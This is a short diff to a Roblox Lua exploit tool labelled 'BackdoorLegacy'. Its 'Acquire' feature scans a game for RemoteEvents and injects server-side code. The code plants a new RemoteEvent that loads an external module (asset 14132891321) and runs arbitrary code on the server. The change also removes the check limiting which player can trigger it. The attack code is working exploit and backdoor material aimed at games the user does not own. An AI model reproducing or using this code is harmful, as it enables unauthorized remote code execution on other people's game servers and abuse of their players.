@@ -91,7 +91,7 @@ Labely.Position = UDim2.new(0,180,0,25)
 Labely.Size = UDim2.new(0,0,0,0)
 Labely.Font = Enum.Font.Legacy
 Labely.FontSize = Enum.FontSize.Size14
-Labely.Text = 'Backdoor Legacy'
+Labely.Text = 'BackdoorLegacy v1.2'
 Labely.TextColor3 = Color3.new(1,0,0)
 
 -- Add functionalities!
@@ -148,7 +148,7 @@ end)
 Acqur.MouseButton1Click:Connect(function()if not isAcquiring then 
 	isAcquiring = true 
 	local RequiredName = string.char(math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90))
-	local AcquireCode = 'local a = Instance.new("RemoteEvent",game:GetService("Players"):WaitForChild("'..game:GetService('Players').LocalPlayer.Name..'")); a.Name = "'..RequiredName..'"; a.OnServerEvent:Connect(function(plr,code)if a.Parent==plr then require(14132891321):SpawnS(code,workspace)end end);' 
+	local AcquireCode = 'local a = Instance.new("RemoteEvent",game:GetService("Players"):WaitForChild("'..game:GetService('Players').LocalPlayer.Name..'")); a.Name = "'..RequiredName..'"; a.OnServerEvent:Connect(function(plr,code)require(14132891321):SpawnS(code,workspace)end);' 
 	Cody.Text = "-- Acquire Feature V2\n-- Acquiring, please wait..."
 	for i,v in pairs(game:GetDescendants()) do if v.Parent ~= game:GetService("RobloxReplicatedStorage") then 
 		if v:IsA("RemoteEvent") then 
